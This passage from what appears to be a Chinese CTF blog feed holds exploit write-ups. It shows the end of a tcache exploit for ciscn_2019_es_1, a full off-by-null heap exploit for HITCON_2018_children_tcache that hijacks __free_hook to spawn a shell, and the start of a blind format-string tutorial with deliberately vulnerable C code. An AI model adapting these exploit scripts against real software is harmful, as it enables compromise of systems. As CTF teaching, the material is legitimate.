class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;info&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./ciscn_2019_es_1&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_1&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27240</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,number</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">&quot;call:\n&quot;</span>)</span><br><span class="line">p.send(number)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xc</span>)<span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">chunk_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">tcache_addr = chunk_addr - <span class="number">0x270</span></span><br><span class="line">log.info(<span class="string">&quot;tcache_addr:&quot;</span>+<span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(tcache_addr),<span class="string">&#x27;f&#x27;</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(tcache_addr),<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,(<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">5</span>+<span class="string">&#x27;\x00&#x27;</span>).ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)+p64(tcache_addr)*<span class="number">3</span>+p64(tcache_addr-<span class="number">0x10</span>),<span class="string">&#x27;c&#x27;</span>*<span class="number">0x4</span>+p64(chunk_addr+<span class="number">0x70</span>))<span class="comment">#3</span></span><br><span class="line"><span class="comment"># add(0x80,&#x27;a&#x27;,&#x27;b&#x27;)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">main_area = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_area - <span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0x4f322</span><span class="comment">#one[1]</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x48</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook),<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook),<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget),<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="HITCON-2018-children-tcache"><a href="#HITCON-2018-children-tcache" class="headerlink" title="HITCON_2018_children_tcache"></a>HITCON_2018_children_tcache</h2><blockquote><p>tcache 结合 off by null</p></blockquote><h3 id="基本情况-3"><a href="#基本情况-3" class="headerlink" title="基本情况"></a>基本情况</h3><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled</code></pre><p>基本堆管理器，有增删查功能。用 chunk_ptr_list 和 chunk_size_list 两个链表维护，数量上限为 12 ，使用的不是只递增的下标，而是哪个下标没有使用就用哪个，即只能同时存在 12 个。</p><h3 id="漏洞-3"><a href="#漏洞-3" class="headerlink" title="漏洞"></a>漏洞</h3><p>写入堆数据时，调用函数先写入到 tmp 局部变量，然后通过 strcpy 写入到堆上。写入函数本身没有问题，写入长度为 size ，将最后一字节替换为结束符。</p><p>问题出在使用 strcpy ：</p><blockquote><p>strcpy 字符串复制函数。复制时，遇到结束符 <code>\x00</code> 才会停止复制。复制结束后，会在最后写入一个结束符 <code>\x00</code> 。</p></blockquote><p>缓冲区的长度为 size ，chunk 空间为 size ，strcpy 写入 size 后，会再次写入 <code>\x00</code> ，造成 off by null ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write_chunk((__int64)&amp;tmp, size);</span><br><span class="line"><span class="built_in">strcpy</span>(ptr, &amp;tmp);</span><br></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>off by null 想到堆重叠（overlapping），和 16 区别主要是申请的 unsorted bin 大小需要大于 0x408 来避免 chunk 放入 tcache 。</p><p>溢出修改 inuse 位比较简单，申请使用下一个 chunk prev_size 的堆直接写满就行，就是 prev_size 怎么写需要想一下办法。因为 free chunk 之前会使用 memset 往堆里填充 size 个 0xda 。</p><ol><li>布置 4 个堆，先释放 chunk0 做好向前 unlink 准备。</li><li>通过写 chunk1 实现：溢出修改 chunk2 inuse ，还原 chunk2 prev_size ，伪造 chunk2 prev_size </li><li>tcache bin double free 劫持 __free_hook 为 onegadget </li></ol><p>整体堆分布和 16 的一样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk0 unsorted bin</span><br><span class="line">chunk1 </span><br><span class="line">chunk2 unsorted bin</span><br><span class="line">chunk3 protect</span><br></pre></td></tr></table></figure><p>chunk0 2 需要大于 0x408 能直接放入 unsorted bin 。chunk2 最低字节需要为 0x01 ，绕过 unlink 检查 next chunk inuse 位。</p><p>然后先把 chunk0 给释放了，后面在释放也可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>溢出修改 inuse 就直接写满堆就行了：释放 chunk1 ，再次申请并写满。</p><p>free 的 memset 写入的字节长度是 chunk_size ，也就是申请多少，free 填充多少，但是 malloc 并不是这样，malloc 会自动对齐。举个例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">size=0xe8 -&gt; chunk_size=0xf0</span><br><span class="line">size=0xe7 -&gt; chunk_size=0xf0</span><br><span class="line">size=0xe6 -&gt; chunk_size=0xf0</span><br></pre></td></tr></table></figure><p>结合以上特点，利用 off by null 逐步将溢出 inuse 时被填充为 0xdadadadadadadada 的 prev_size 还原回来（恢复 prev_size 高 5 字节就行了）</p><p>溢出修改 inuse ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201024003012.png" alt="image-20201024003012232"></p><p>恢复最高字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xe7</span>,<span class="string">&#x27;k&#x27;</span>*<span class="number">0xe7</span>)</span><br></pre></td></tr></table></figure><p>以此类推写成循环即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">add(<span class="number">0xe8</span>-i,<span class="string">&#x27;k&#x27;</span>*(<span class="number">0xe8</span>-i))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&#x27;k&#x27;</span>*<span class="number">0xe0</span>+p64(<span class="number">0x510</span>))</span><br></pre></td></tr></table></figure><p>构造完成利用条件，后面是常规 unsortbin 泄露：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;leak libc&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>最后 getshell 利用 tcache double free 将堆分配到 free_hook 。虽然程序没有 UAF ，但是前面 unsortbin 利用完还有一大块堆在 bin 中，刚好堆头在 chunk1 （用来泄露地址那个堆），本身已经有一个指针了，然后再申请一个相同大小的堆就有第二个指针了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;getshell&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">onegadget = libc_base + <span class="number">0x4f322</span><span class="comment">#0x4f3c2</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line">log.info(<span class="string">&quot;free_hook&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x202060)&quot;)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./HITCON_2018_children_tcache&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./HITCON_2018_children_tcache&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28300</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">add(<span class="number">0xe8</span>-i,<span class="string">&#x27;k&#x27;</span>*(<span class="number">0xe8</span>-i))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&#x27;k&#x27;</span>*<span class="number">0xe0</span>+p64(<span class="number">0x510</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;leak libc&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr -<span class="number">0x3ebca0</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;getshell&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">onegadget = libc_base + <span class="number">0x4f322</span><span class="comment">#0x4f3c2</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line">log.info(<span class="string">&quot;free_hook&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x202060)&quot;)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blind_pwn之格式化字符串</title>
      <link href="archives/ca13b906/"/>
      <url>archives/ca13b906/</url>
      
        <content type="html"><![CDATA[<p>[scode type=”lblue”]文章首发于<a href="http://www.heetian.com/info/828">合天众智</a>，转载到博客仅作备份[/scode]</p><h2 id="可能需要提前了解的知识"><a href="#可能需要提前了解的知识" class="headerlink" title="可能需要提前了解的知识"></a>可能需要提前了解的知识</h2><ul><li>格式化字符串原理&amp;利用</li><li>got &amp; plt 调用关系</li><li>程序的一般启动过程</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>格式化字符串盲打指的是只给出可交互的 ip 地址与端口，不给出对应的 binary 文件来让我们无法通过 IDA 分析，其实这个和 BROP 差不多，不过 BROP 利用的是栈溢出，而这里我们利用的是无限格式化字符串漏洞，把在内存中的程序给<code>dump</code>下来。</p><p>一般来说，我们按照如下步骤进行</p><ul><li>确定程序的位数（不同位数有些许差别）</li><li>确定漏洞位置</li><li>利用</li></ul><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ul><li>可以读入 ‘\x00’ 字符的</li><li>输出函数均是 ‘\x00’ 截断的</li><li>能无限使用格式化字符串漏洞</li></ul><h2 id="32-位利用手法"><a href="#32-位利用手法" class="headerlink" title="32 位利用手法"></a>32 位利用手法</h2><h3 id="实验环境准备"><a href="#实验环境准备" class="headerlink" title="实验环境准备"></a>实验环境准备</h3><p>程序源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    FILE* f;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fgets(buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (flag == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Do you want the flag?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">&#x27;\0&#x27;</span>,<span class="number">1024</span>);</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;no\n&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I see. Good bye.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your input isn&#x27;t right:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please Try again!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译 32 位文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure><p>用 socat 挂到端口 10001 上部署：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./leakmemory</span><br></pre></td></tr></table></figure><p>实验环境完成，如果是本地部署的话，等等在 exp 里面写 remote(“127.0.0.1”,10001) 模拟没有 binary 的远程盲打情况。</p><h3 id="确定程序的位数"><a href="#确定程序的位数" class="headerlink" title="确定程序的位数"></a>确定程序的位数</h3><p>用 %p 看看程序回显输出的长度是多少，以此判断程序的位数。这里看到回显是 4 个字节，判断是 32 位程序。可以再多泄露几个，都是 4 字节（含）以下的，确定为 32 位程序。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-Kx9VDaOOQNBdpnH2.png"></p><h3 id="确定格式化字符串偏移"><a href="#确定格式化字符串偏移" class="headerlink" title="确定格式化字符串偏移"></a>确定格式化字符串偏移</h3><p>找到格式化字符串的偏移是多少，在后续操作中会用到。由于没有 binary 不能通过调试分析偏移，就采取输入多个 %p 泄露出偏移。为了容易辨认，字符串开始先填充 4 字节 的填充（64位8字节），然后再填入 %p 。</p><p>最后确认偏移为 7 。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-f9Zjpwdc65xvO91W.png"></p><h3 id="dump-程序"><a href="#dump-程序" class="headerlink" title="dump 程序"></a>dump 程序</h3><p>dump 程序应该选哪个格式化字符串：</p><p><strong>%n$s</strong> ：将第 n 个参数的值作为地址，输出这个地址指向的字符串内容</p><p><strong>%n$p</strong> ：将第 n 个参数的值作为内容，以十六进制形式输出</p><p>我们是需要 dump 程序，也就是想获取我们所给定地址的内容，而不是获取我们给定的地址。所以应该用 <strong>%n$s</strong> 把我们给定地址当作指针，输出给定地址所指向的字符串。结合前面知道格式化字符串偏移为 7 ，payload 应该为：<code>%9$s.TMP[addr]</code> 。</p><p><strong>注意</strong>：使用 %s 进行输出并不是一个字节一个字节输出，而是一直输出直到遇到 \x00 截止符才会停止，也就是每次泄露的长度是不确定的，可能很长也可能是空。因为 .text 段很可能有连续 \x00 ，所以泄露脚本处理情况有：</p><ol><li>针对每次泄露长度不等，addr 根据每次泄露长度动态增加；</li><li>泄露字符串可能为空，也就是如何处理 \x00 ；</li></ol><p>除此之外，还有一个问题是泄露的起始地址在哪里？从各个大佬文章学到两种做法：从 .text 段开始；从程序加载地方开始；两种方法泄露出来程序，在 ida 中呈现有差别。</p><h4 id="从程序加载地方开始"><a href="#从程序加载地方开始" class="headerlink" title="从程序加载地方开始"></a>从程序加载地方开始</h4><p>先来说省事的，<strong>从程序加载地方开始</strong>。程序加载地方 32 位和 64 位各不相同：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-CTSvll4wMcTxU1DR.png"></p><p>32 位：从 0x8048000 开始泄露</p><p>64 位：从 0x400000 开始泄露</p><p>下面是这条例题的泄露脚本，结合注解分析如何处理上面提到的问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 